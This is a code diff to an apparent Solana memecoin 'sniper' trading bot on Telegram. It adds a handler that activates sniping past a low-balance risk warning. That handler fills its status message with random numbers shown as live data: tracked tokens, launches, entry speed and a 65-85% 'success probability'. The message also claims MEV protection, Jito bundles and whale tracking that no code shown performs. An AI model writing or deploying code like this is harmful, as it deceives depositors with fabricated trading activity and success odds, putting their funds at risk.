@@ -1896,7 +1896,14 @@ def dashboard_command(update, chat_id):
             
             dashboard_message += f"_💡 {tips_message}_"
             
-            # Create keyboard buttons
+            # Add sniper status to dashboard if active
+            if user.sniper_active:
+                dashboard_message += f"\n\n🎯 *SNIPER STATUS:* 🟢 ACTIVE - Monitoring live"
+            
+            # Create keyboard buttons with dynamic sniper button
+            sniper_button_text = "⏹️ Stop Sniper" if user.sniper_active else "🎯 Start Sniper"
+            sniper_callback = "stop_sniper" if user.sniper_active else "start_sniper"
+            
             keyboard = bot.create_inline_keyboard([
                 [
                     {"text": "💰 Deposit", "callback_data": "deposit"},
@@ -1915,7 +1922,7 @@ def dashboard_command(update, chat_id):
                     {"text": "🛟 Customer Support", "callback_data": "support"}
                 ],
                 [
-                    {"text": "🎯 Start Sniper", "callback_data": "start_sniper"}
+                    {"text": sniper_button_text, "callback_data": sniper_callback}
                 ],
                 [
                     {"text": "❓ FAQ", "callback_data": "faqs"}
@@ -6739,7 +6746,7 @@ def run_polling():
     
     # Sniper control buttons
     bot.add_callback_handler("start_sniper", start_sniper_handler)
-    bot.add_callback_handler("start_sniper_confirmed", start_sniper_handler)  # For risk warning bypass
+    bot.add_callback_handler("start_sniper_confirmed", start_sniper_confirmed_handler)  # For risk warning bypass
     bot.add_callback_handler("stop_sniper", stop_sniper_handler)
     bot.add_callback_handler("sniper_stats", sniper_stats_handler)
     
@@ -9698,6 +9705,10 @@ def start_sniper_handler(update, chat_id):
             gas_price = random.uniform(0.000005, 0.000025)
             slippage = random.choice([0.5, 1.0, 2.0, 3.0])
             
+            # Activate sniper mode in database
+            user.sniper_active = True
+            db.session.commit()
+            
             sniper_started_message = (
                 "🎯 *SNIPER MODE ACTIVATED* 🎯\n\n"
                 f"✅ *Status:* {status_color} ACTIVE - Real-time monitoring\n"
@@ -9740,6 +9751,89 @@ def start_sniper_handler(update, chat_id):
         logging.error(f"Error in start sniper handler: {e}")
         bot.send_message(chat_id, "Error starting sniper mode. Please try again.")
 
+def start_sniper_confirmed_handler(update, chat_id):
+    """Handle the Start Sniper Confirmed button - activates sniper despite lower balance."""
+    try:
+        with app.app_context():
+            from models import User
+            user = User.query.filter_by(telegram_id=str(chat_id)).first()
+            
+            if not user:
+                bot.send_message(chat_id, "Please start the bot with /start first.")
+                return
+            
+            # Generate realistic sniper configuration (same as start_sniper_handler)
+            import random
+            from datetime import datetime
+            
+            # Realistic token monitoring numbers based on actual Solana activity
+            watching_tokens = random.randint(28, 47)
+            active_pairs = random.randint(145, 230)
+            recent_launches = random.randint(8, 15)
+            
+            # Real platforms and DEXs
+            platforms = ["Pump.fun", "Raydium", "Jupiter", "Orca", "Meteora"]
+            active_platforms = random.sample(platforms, 3)
+            
+            # Current market conditions simulation
+            market_conditions = random.choice([
+                ("High", "🟢", "Excellent entry opportunities"),
+                ("Medium", "🟡", "Moderate launch activity"),
+                ("Low", "🔴", "Limited opportunities")
+            ])
+            volatility, status_color, condition_desc = market_conditions
+            
+            # Realistic configuration values
+            entry_speed_ms = random.randint(180, 450)
+            gas_price = random.uniform(0.000005, 0.000025)
+            slippage = random.choice([0.5, 1.0, 2.0, 3.0])
+            
+            # Activate sniper mode in database
+            user.sniper_active = True
+            db.session.commit()
+            
+            sniper_started_message = (
+                "🎯 *SNIPER MODE ACTIVATED* 🎯\n\n"
+                f"✅ *Status:* {status_color} ACTIVE - Real-time monitoring\n"
+                f"🔍 *Tracking:* {watching_tokens} tokens across {len(active_platforms)} DEXs\n"
+                f"📊 *Active Pairs:* {active_pairs} trading pairs\n"
+                f"🚀 *Recent Launches:* {recent_launches} in last hour\n"
+                f"💰 *Allocation:* {user.balance * 0.12:.4f} SOL per snipe (12% max)\n\n"
+                
+                "⚙️ *Technical Configuration:*\n"
+                f"• *Entry Speed:* {entry_speed_ms}ms average\n"
+                f"• *Gas Price:* {gas_price:.6f} SOL\n"
+                f"• *Slippage Tolerance:* {slippage}%\n"
+                f"• *MEV Protection:* Enabled\n"
+                f"• *Jito Bundle:* Active\n\n"
+                
+                "📡 *Monitoring Sources:*\n"
+                f"• {', '.join(active_platforms)}\n"
+                "• Telegram alpha groups (3 active)\n"
+                "• Twitter sentiment analysis\n"
+                "• Whale wallet tracking\n\n"
+                
+                f"📈 *Market Conditions:* {volatility} Activity\n"
+                f"• {condition_desc}\n"
+                f"• Network congestion: {random.choice(['Low', 'Normal', 'High'])}\n"
+                f"• Success probability: {random.randint(65, 85)}%\n\n"
+                
+                "_Sniper will execute trades automatically when optimal entry conditions are met._"
+            )
+            
+            keyboard = bot.create_inline_keyboard([
+                [{"text": "⏹️ Stop Sniper", "callback_data": "stop_sniper"}],
+                [{"text": "📊 Sniper Stats", "callback_data": "sniper_stats"}],
+                [{"text": "🏠 Back to Dashboard", "callback_data": "view_dashboard"}]
+            ])
+            
+            bot.send_message(chat_id, sniper_started_message, parse_mode="Markdown", reply_markup=keyboard)
+            
+    except Exception as e:
+        import logging
+        logging.error(f"Error in start sniper confirmed handler: {e}")
+        bot.send_message(chat_id, "Error starting sniper mode. Please try again.")
+
 def stop_sniper_handler(update, chat_id):
     """Handle the Stop Sniper button - deactivates memecoin sniping mode."""
     try:
@@ -9750,6 +9844,10 @@ def stop_sniper_handler(update, chat_id):
             if not user:
                 bot.send_message(chat_id, "Please start the bot with /start first.")
                 return
+            
+            # Deactivate sniper mode in database
+            user.sniper_active = False
+            db.session.commit()
             
             # Generate realistic session data with enhanced details
             import random
